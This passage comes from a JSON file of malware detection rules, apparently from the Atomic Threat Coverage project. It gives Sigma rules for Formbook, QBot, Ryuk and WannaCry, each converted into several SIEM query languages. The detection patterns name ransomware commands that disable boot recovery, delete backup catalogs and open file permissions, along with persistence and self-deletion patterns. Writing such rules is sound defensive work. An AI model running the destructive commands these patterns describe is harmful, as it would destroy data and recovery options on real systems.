}\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* \\\\-e* PAA* *JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ* *QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA* *kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA* *IgAoACcAKgAnACkAOwAkA* *IAKAAnACoAJwApADsAJA* *iACgAJwAqACcAKQA7ACQA*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -e* PAA*\" OR CommandLine=\"*JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ*\" OR CommandLine=\"*QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA*\" OR CommandLine=\"*kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA*\" OR CommandLine=\"*IgAoACcAKgAnACkAOwAkA*\" OR CommandLine=\"*IAKAAnACoAJwApADsAJA*\" OR CommandLine=\"*iACgAJwAqACcAKQA7ACQA*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* -e* PAA*\", \"*JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ*\", \"*QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA*\", \"*kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA*\", \"*IgAoACcAKgAnACkAOwAkA*\", \"*IAKAAnACoAJwApADsAJA*\", \"*iACgAJwAqACcAKQA7ACQA*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -e.* PAA.*|.*.*JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ.*|.*.*QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA.*|.*.*kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA.*|.*.*IgAoACcAKgAnACkAOwAkA.*|.*.*IAKAAnACoAJwApADsAJA.*|.*.*iACgAJwAqACcAKQA7ACQA.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Formbook Process Creation\nid: 032f5fb3-d959-41a5-9263-4173c802dc2b\nstatus: experimental\ndescription: Detects Formbook like process executions that inject code into a set of files in the System32 folder, which executes a special command command line to\n    delete the dropper from the AppData Temp folder. We avoid false positives by excluding all parent process with command line parameters.\nauthor: Florian Roth\ndate: 2019/09/30\nmodified: 2019/10/31\nreferences:\n    - https://inquest.net/blog/2018/06/22/a-look-at-formbook-stealer\n    - https://app.any.run/tasks/388d5802-aa48-4826-b069-250420504758/\n    - https://app.any.run/tasks/8e22486b-5edc-4cef-821c-373e945f296c/\n    - https://app.any.run/tasks/62bb01ae-25a4-4180-b278-8e464a90b8d7/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Parent command line should not contain a space value\n        # This avoids false positives not caused by process injection\n        # e.g. wscript.exe /B sysmon-install.vbs\n        ParentCommandLine: \n            - 'C:\\Windows\\System32\\\\*.exe'\n            - 'C:\\Windows\\SysWOW64\\\\*.exe'\n        CommandLine: \n            - '* /c del \"C:\\Users\\\\*\\AppData\\Local\\Temp\\\\*.exe'\n            - '* /c del \"C:\\Users\\\\*\\Desktop\\\\*.exe'\n            - '* /C type nul > \"C:\\Users\\\\*\\Desktop\\\\*.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentCommandLine.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*.exe OR C\\\\:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*.exe) AND CommandLine.keyword:(*\\\\ \\\\/c\\\\ del\\\\ \\\\\"C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\*.exe OR *\\\\ \\\\/c\\\\ del\\\\ \\\\\"C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe OR *\\\\ \\\\/C\\\\ type\\\\ nul\\\\ \\\\ \\\\\"C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Formbook-Process-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Formbook Process Creation\",\\n    \"description\": \"Detects Formbook like process executions that inject code into a set of files in the System32 folder, which executes a special command command line to delete the dropper from the AppData Temp folder. We avoid false positives by excluding all parent process with command line parameters.\",\\n    \"tags\": \"\",\\n    \"query\": \"(ParentCommandLine.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\*.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\*.exe) AND CommandLine.keyword:(*\\\\\\\\ \\\\\\\\/c\\\\\\\\ del\\\\\\\\ \\\\\\\\\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*.exe OR *\\\\\\\\ \\\\\\\\/c\\\\\\\\ del\\\\\\\\ \\\\\\\\\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\*.exe OR *\\\\\\\\ \\\\\\\\/C\\\\\\\\ type\\\\\\\\ nul\\\\\\\\ \\\\\\\\ \\\\\\\\\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\*.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentCommandLine.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\*.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\*.exe) AND CommandLine.keyword:(*\\\\\\\\ \\\\\\\\/c\\\\\\\\ del\\\\\\\\ \\\\\\\\\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*.exe OR *\\\\\\\\ \\\\\\\\/c\\\\\\\\ del\\\\\\\\ \\\\\\\\\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\*.exe OR *\\\\\\\\ \\\\\\\\/C\\\\\\\\ type\\\\\\\\ nul\\\\\\\\ \\\\\\\\ \\\\\\\\\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\*.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Formbook Process Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentCommandLine.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*.exe C\\\\:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*.exe) AND CommandLine.keyword:(* \\\\/c del \\\\\"C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\*.exe * \\\\/c del \\\\\"C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe * \\\\/C type nul  \\\\\"C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentCommandLine=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*.exe\" OR ParentCommandLine=\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*.exe\") (CommandLine=\"* /c del \\\\\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\*.exe\" OR CommandLine=\"* /c del \\\\\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe\" OR CommandLine=\"* /C type nul > \\\\\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentCommandLine IN [\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*.exe\", \"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*.exe\"] CommandLine IN [\"* /c del \\\\\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\*.exe\", \"* /c del \\\\\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe\", \"* /C type nul > \\\\\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\Desktop\\\\\\\\*.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*(?=.*(?:.*C:\\\\Windows\\\\System32\\\\\\\\.*\\\\.exe|.*C:\\\\Windows\\\\SysWOW64\\\\\\\\.*\\\\.exe))(?=.*(?:.*.* /c del \"C:\\\\Users\\\\\\\\.*\\\\AppData\\\\Local\\\\Temp\\\\\\\\.*\\\\.exe|.*.* /c del \"C:\\\\Users\\\\\\\\.*\\\\Desktop\\\\\\\\.*\\\\.exe|.*.* /C type nul > \"C:\\\\Users\\\\\\\\.*\\\\Desktop\\\\\\\\.*\\\\.exe)))\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: QBot Process Creation\nid: 4fcac6eb-0287-4090-8eea-2602e4c20040\nstatus: experimental\ndescription: Detects QBot like process executions\nauthor: Florian Roth\ndate: 2019/10/01\nreferences:\n    - https://twitter.com/killamjr/status/1179034907932315648\n    - https://app.any.run/tasks/2e0647b7-eb86-4f72-904b-d2d0ecac07d1/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentImage: '*\\WinRAR.exe'\n        Image: '*\\wscript.exe'\n    selection2:\n        CommandLine: '* /c ping.exe -n 6 127.0.0.1 & type *'\n    condition: selection1 or selection2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:*\\\\\\\\WinRAR.exe AND Image.keyword:*\\\\\\\\wscript.exe) OR CommandLine.keyword:*\\\\ \\\\/c\\\\ ping.exe\\\\ \\\\-n\\\\ 6\\\\ 127.0.0.1\\\\ &\\\\ type\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/QBot-Process-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"QBot Process Creation\",\\n    \"description\": \"Detects QBot like process executions\",\\n    \"tags\": \"\",\\n    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\WinRAR.exe AND Image.keyword:*\\\\\\\\\\\\\\\\wscript.exe) OR CommandLine.keyword:*\\\\\\\\ \\\\\\\\/c\\\\\\\\ ping.exe\\\\\\\\ \\\\\\\\-n\\\\\\\\ 6\\\\\\\\ 127.0.0.1\\\\\\\\ &\\\\\\\\ type\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\WinRAR.exe AND Image.keyword:*\\\\\\\\\\\\\\\\wscript.exe) OR CommandLine.keyword:*\\\\\\\\ \\\\\\\\/c\\\\\\\\ ping.exe\\\\\\\\ \\\\\\\\-n\\\\\\\\ 6\\\\\\\\ 127.0.0.1\\\\\\\\ &\\\\\\\\ type\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'QBot Process Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:*\\\\\\\\WinRAR.exe AND Image.keyword:*\\\\\\\\wscript.exe) OR CommandLine.keyword:* \\\\/c ping.exe \\\\-n 6 127.0.0.1 & type *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\WinRAR.exe\" Image=\"*\\\\\\\\wscript.exe\") OR CommandLine=\"* /c ping.exe -n 6 127.0.0.1 & type *\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((ParentImage=\"*\\\\\\\\WinRAR.exe\" Image=\"*\\\\\\\\wscript.exe\") OR CommandLine=\"* /c ping.exe -n 6 127.0.0.1 & type *\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\WinRAR\\\\.exe)(?=.*.*\\\\wscript\\\\.exe))|.*.* /c ping\\\\.exe -n 6 127\\\\.0\\\\.0\\\\.1 & type .*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Ryuk Ransomware\nid: c37510b8-2107-4b78-aa32-72f251e7a844\nstatus: experimental\ndescription: Detects Ryuk ransomware activity\nauthor: Florian Roth\ndate: 2019/12/16\nreferences:\n    - https://app.any.run/tasks/d860402c-3ff4-4c1f-b367-0237da714ed1/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Microsoft\\Windows\\CurrentVersion\\Run'\n            - 'C:\\users\\Public\\'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* AND CommandLine.keyword:*C\\\\:\\\\\\\\users\\\\\\\\Public\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Ryuk-Ransomware <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Ryuk Ransomware\",\\n    \"description\": \"Detects Ryuk ransomware activity\",\\n    \"tags\": \"\",\\n    \"query\": \"(CommandLine.keyword:*Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* AND CommandLine.keyword:*C\\\\\\\\:\\\\\\\\\\\\\\\\users\\\\\\\\\\\\\\\\Public\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* AND CommandLine.keyword:*C\\\\\\\\:\\\\\\\\\\\\\\\\users\\\\\\\\\\\\\\\\Public\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Ryuk Ransomware\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* AND CommandLine.keyword:*C\\\\:\\\\\\\\users\\\\\\\\Public\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\" CommandLine=\"*C:\\\\\\\\users\\\\\\\\Public\\\\*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\" CommandLine=\"*C:\\\\\\\\users\\\\\\\\Public\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.*)(?=.*.*C:\\\\users\\\\Public\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WannaCry Ransomware\nid: 41d40bff-377a-43e2-8e1b-2e543069e079\nstatus: experimental\ndescription: Detects WannaCry ransomware activity\nreferences:\n    - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\nauthor: Florian Roth (rule), Tom U. @c_APT_ure (collection)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\tasksche.exe'\n            - '*\\mssecsvc.exe'\n            - '*\\taskdl.exe'\n            - '*\\@WanaDecryptor@*'\n            - '*\\WanaDecryptor*'\n            - '*\\taskhsvc.exe'\n            - '*\\taskse.exe'\n            - '*\\111.exe'\n            - '*\\lhdfrgui.exe'\n            - '*\\diskpart.exe'\n            - '*\\linuxnew.exe'\n            - '*\\wannacry.exe'\n    selection2:\n        CommandLine:\n            - '*icacls * /grant Everyone:F /T /C /Q*'\n            - '*bcdedit /set {default} recoveryenabled no*'\n            - '*wbadmin delete catalog -quiet*'\n            - '*@Please_Read_Me@.txt*'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Diskpart.exe usage to manage partitions on the local hard drive\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\tasksche.exe OR *\\\\\\\\mssecsvc.exe OR *\\\\\\\\taskdl.exe OR *\\\\\\\\@WanaDecryptor@* OR *\\\\\\\\WanaDecryptor* OR *\\\\\\\\taskhsvc.exe OR *\\\\\\\\taskse.exe OR *\\\\\\\\111.exe OR *\\\\\\\\lhdfrgui.exe OR *\\\\\\\\diskpart.exe OR *\\\\\\\\linuxnew.exe OR *\\\\\\\\wannacry.exe) OR CommandLine.keyword:(*icacls\\\\ *\\\\ \\\\/grant\\\\ Everyone\\\\:F\\\\ \\\\/T\\\\ \\\\/C\\\\ \\\\/Q* OR *bcdedit\\\\ \\\\/set\\\\ \\\\{default\\\\}\\\\ recoveryenabled\\\\ no* OR *wbadmin\\\\ delete\\\\ catalog\\\\ \\\\-quiet* OR *@Please_Read_Me@.txt*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WannaCry-Ransomware <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WannaCry Ransomware\",\\n    \"description\": \"Detects WannaCry ransomware activity\",\\n    \"tags\": \"\",\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\tasksche.exe OR *\\\\\\\\\\\\\\\\mssecsvc.exe OR *\\\\\\\\\\\\\\\\taskdl.exe OR *\\\\\\\\\\\\\\\\@WanaDecryptor@* OR *\\\\\\\\\\\\\\\\WanaDecryptor* OR *\\\\\\\\\\\\\\\\taskhsvc.exe OR *\\\\\\\\\\\\\\\\taskse.exe OR *\\\\\\\\\\\\\\\\111.exe OR *\\\\\\\\\\\\\\\\lhdfrgui.exe OR *\\\\\\\\\\\\\\\\diskpart.exe OR *\\\\\\\\\\\\\\\\linuxnew.exe OR *\\\\\\\\\\\\\\\\wannacry.exe) OR CommandLine.keyword:(*icacls\\\\\\\\ *\\\\\\\\ \\\\\\\\/grant\\\\\\\\ Everyone\\\\\\\\:F\\\\\\\\ \\\\\\\\/T\\\\\\\\ \\\\\\\\/C\\\\\\\\ \\\\\\\\/Q* OR *bcdedit\\\\\\\\ \\\\\\\\/set\\\\\\\\ \\\\\\\\{default\\\\\\\\}\\\\\\\\ recoveryenabled\\\\\\\\ no* OR *wbadmin\\\\\\\\ delete\\\\\\\\ catalog\\\\\\\\ \\\\\\\\-quiet* OR *@Please_Read_Me@.txt*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\tasksche.exe OR *\\\\\\\\\\\\\\\\mssecsvc.exe OR *\\\\\\\\\\\\\\\\taskdl.exe OR *\\\\\\\\\\\\\\\\@WanaDecryptor@* OR *\\\\\\\\\\\\\\\\WanaDecryptor* OR *\\\\\\\\\\\\\\\\taskhsvc.exe OR *\\\\\\\\\\\\\\\\taskse.exe OR *\\\\\\\\\\\\\\\\111.exe OR *\\\\\\\\\\\\\\\\lhdfrgui.exe OR *\\\\\\\\\\\\\\\\diskpart.exe OR *\\\\\\\\\\\\\\\\linuxnew.exe OR *\\\\\\\\\\\\\\\\wannacry.exe) OR CommandLine.keyword:(*icacls\\\\\\\\ *\\\\\\\\ \\\\\\\\/grant\\\\\\\\ Everyone\\\\\\\\:F\\\\\\\\ \\\\\\\\/T\\\\\\\\ \\\\\\\\/C\\\\\\\\ \\\\\\\\/Q* OR *bcdedit\\\\\\\\ \\\\\\\\/set\\\\\\\\ \\\\\\\\{default\\\\\\\\}\\\\\\\\ recoveryenabled\\\\\\\\ no* OR *wbadmin\\\\\\\\ delete\\\\\\\\ catalog\\\\\\\\ \\\\\\\\-quiet* OR *@Please_Read_Me@.txt*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WannaCry Ransomware\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\tasksche.exe *\\\\\\\\mssecsvc.exe *\\\\\\\\taskdl.exe *\\\\\\\\@WanaDecryptor@* *\\\\\\\\WanaDecryptor* *\\\\\\\\taskhsvc.exe *\\\\\\\\taskse.exe *\\\\\\\\111.exe *\\\\\\\\lhdfrgui.exe *\\\\\\\\diskpart.exe *\\\\\\\\linuxnew.exe *\\\\\\\\wannacry.exe) OR CommandLine.keyword:(*icacls * \\\\/grant Everyone\\\\:F \\\\/T \\\\/C \\\\/Q* *bcdedit \\\\/set \\\\{default\\\\} recoveryenabled no* *wbadmin delete catalog \\\\-quiet* *@Please_Read_Me@.txt*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\tasksche.exe\" OR Image=\"*\\\\\\\\mssecsvc.exe\" OR Image=\"*\\\\\\\\taskdl.exe\" OR Image=\"*\\\\\\\\@WanaDecryptor@*\" OR Image=\"*\\\\\\\\WanaDecryptor*\" OR Image=\"*\\\\\\\\taskhsvc.exe\" OR Image=\"*\\\\\\\\taskse.exe\" OR Image=\"*\\\\\\\\111.exe\" OR Image=\"*\\\\\\\\lhdfrgui.exe\" OR Image=\"*\\\\\\\\diskpart.exe\" OR Image=\"*\\\\\\\\linuxnew.exe\" OR Image=\"*\\\\\\\\wannacry.exe\") OR (CommandLine=\"*icacls * /grant Everyone:F /T /C /Q*\" OR CommandLine=\"*bcdedit /set {default} recoveryenabled no*\" OR CommandLine=\"*wbadmin delete catalog -quiet*\" OR CommandLine=\"*@Please_Read_Me@.txt*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image IN [\"*\\\\\\\\tasksche.exe\", \"*\\\\\\\\mssecsvc.exe\", \"*\\\\\\\\taskdl.exe\", \"*\\\\\\\\@WanaDecryptor@*\", \"*\\\\\\\\WanaDecryptor*\", \"*\\\\\\\\taskhsvc.exe\", \"*\\\\\\\\taskse.exe\", \"*\\\\\\\\111.exe\", \"*\\\\\\\\lhdfrgui.exe\", \"*\\\\\\\\diskpart.exe\", \"*\\\\\\\\linuxnew.exe\", \"*\\\\\\\\wannacry.exe\"] OR CommandLine IN [\"*icacls * /grant Everyone:F /T /C /Q*\", \"*bcdedit /set {default} recoveryenabled no*\", \"*wbadmin delete catalog -quiet*\", \"*@Please_Read_Me@.txt*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P 